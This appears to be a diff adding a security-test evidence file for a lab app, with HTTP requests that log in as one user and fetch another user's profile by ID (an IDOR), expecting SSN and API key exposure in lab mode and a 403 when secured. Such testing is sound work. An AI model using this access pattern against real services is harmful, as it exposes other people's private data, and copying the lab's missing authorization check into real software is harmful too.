@@ -1,0 +1,17 @@
+### SEC-001 evidence — IDOR user profile (lab mode)
+
+# 1) Login as alice
+POST http://127.0.0.1:8000/api/login
+Content-Type: application/json
+
+{
+  "username": "alice",
+  "password": "password123"
+}
+
+# 2) Access bob's profile with alice token (replace TOKEN)
+GET http://127.0.0.1:8000/api/users/2
+Authorization: Bearer TOKEN
+
+# Expected (lab): 200 with bob + ssn/api_key
+# Expected (secure): 403
